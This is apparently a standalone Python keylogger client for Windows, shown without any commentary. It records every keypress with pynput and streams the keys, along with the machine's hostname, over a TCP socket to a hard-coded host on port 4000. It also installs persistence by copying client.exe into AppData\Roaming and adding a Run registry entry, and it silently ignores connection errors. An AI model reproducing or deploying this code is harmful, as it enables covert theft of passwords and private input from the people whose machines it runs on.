def main():
    import socket
    from pynput import keyboard
    HOST = "192.168.50.1"
    PORT = 4000
    FORMAT = "utf-8"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send(socket.gethostname().encode())
        while True:
            try:
                def _key(keys):
                    keys = str(keys)
                    s.send(keys.encode(FORMAT))
                with keyboard.Listener(on_press=_key) as listener:
                    listener.join()
            except ConnectionResetError:
                pass
            except ConnectionRefusedError:
                pass
            except OSError:
                pass

if __name__ == "__main__":
    import winreg
    import os
    username = os.getlogin()
    os.system(f"copy client.exe C:\\Users\\{username}\\AppData\\Roaming")
    key = winreg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    winreg.SetValueEx(winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS), "4000_Port", 0, winreg.REG_SZ, f"C:\\Users\\{username}\\AppData\\Roaming\\client.exe")
    
    main()
